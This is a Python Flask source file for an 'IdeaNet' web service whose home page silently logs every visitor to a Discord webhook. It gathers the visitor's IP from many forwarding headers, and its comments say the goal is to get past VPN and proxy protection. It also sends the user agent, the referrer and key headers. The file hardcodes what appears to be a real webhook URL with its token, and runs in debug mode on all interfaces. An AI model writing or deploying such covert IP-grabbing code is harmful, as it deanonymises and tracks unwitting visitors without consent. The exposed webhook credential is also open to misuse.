# main.py - IdeaNet Web Service with Discord Webhook IP Logging 🔥
# esgroup (TM) - Alpha edition 2026 😈💀

from flask import Flask, render_template, request
import datetime
import requests
import json

app = Flask(__name__)

# ─── PASTE YOUR DISCORD (OR OTHER) WEBHOOK URL HERE BEFORE COMMIT ───
WEBHOOK_URL = "https://discord.com/api/webhooks/1467328811417735309/BZ1KXIYwY8ccyvS-MLXwtR6CXzj_LyB36bG_GEJVfMa_MEaTAmTIqKqDqcnDAGzitqwc"
# ^ Replace the whole line above with your real webhook URL
# Example: WEBHOOK_URL = "https://discord.com/api/webhooks/123456789012345678/abcDEF123ghiJKL..."

def get_possible_ips():
    """Grab every possible IP header to try to bypass VPN/proxy bullshit"""
    possible = []
    
    if request.remote_addr and request.remote_addr != "127.0.0.1":
        possible.append(("direct/remote_addr", request.remote_addr))
    
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        ips = [ip.strip() for ip in forwarded.split(",")]
        for ip in ips:
            if ip and not ip.startswith(("10.", "172.16.", "192.168.", "127.", "fc", "fd", "::1")):
                possible.append(("X-Forwarded-For (first non-private)", ip))
                break

    headers_to_check = [
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Client-IP",
        "X-Forwarded",
        "Forwarded-For",
        "Client-IP",
        "X-Cluster-Client-IP",
    ]
    
    for h in headers_to_check:
        val = request.headers.get(h)
        if val:
            possible.append((h, val.split(",")[0].strip()))

    return possible

def send_to_webhook(log_data):
    """Fire the log to your webhook motherfucker"""
    if not WEBHOOK_URL or "YOUR_WEBHOOK" in WEBHOOK_URL:
        print("[!] Webhook URL not set - skipping send")
        return
    
    payload = {
        "content": None,
        "embeds": [{
            "title": "IdeaNet Visitor Logged 🔥",
            "description": log_data,
            "color": 0xff0000,  # red for chaos
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "footer": {"text": "esgroup (TM) • Alpha owns this shit 😈"}
        }]
    }
    
    try:
        r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        if r.status_code not in [200, 204]:
            print(f"[!] Webhook failed: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[!] Webhook error: {e}")

def log_visitor():
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    ip_attempts = get_possible_ips()
    
    best_ip = "unknown"
    if ip_attempts:
        priority = ["CF-Connecting-IP", "X-Real-IP", "X-Forwarded-For", "remote_addr"]
        for pri in priority:
            for name, ip in ip_attempts:
                if pri.lower() in name.lower() or pri == name:
                    best_ip = ip
                    break
            if best_ip != "unknown":
                break
        if best_ip == "unknown":
            best_ip = ip_attempts[0][1]

    user_agent = request.headers.get("User-Agent", "unknown")
    referrer = request.headers.get("Referer", "none")
    
    # Build sexy log message
    log_msg = f"**Visitor Hit @ {now}**\n"
    log_msg += f"**Best Guess IP:** `{best_ip}`\n"
    log_msg += f"**User-Agent:** `{user_agent}`\n"
    log_msg += f"**Referrer:** `{referrer}`\n"
    log_msg += f"**All Possible IPs:**\n"
    for name, ip in ip_attempts:
        log_msg += f"- {name}: `{ip}`\n"
    
    # Full headers dump (shortened a bit to not spam too hard)
    headers_short = ""
    important_headers = ["User-Agent", "Referer", "Accept-Language", "X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]
    for k, v in request.headers:
        if any(h.lower() in k.lower() for h in important_headers) or "forward" in k.lower():
            headers_short += f"{k}: {v}\n"
    
    log_msg += f"\n**Key Headers:**\n```\n{headers_short.strip()}\n```"
    
    send_to_webhook(log_msg)

@app.route('/')
def home():
    log_visitor()  # every single visitor gets logged to webhook
    return render_template('index.html')

if __name__ == '__main__':
    # Local testing only
    app.run(host='0.0.0.0', port=5000, debug=True)
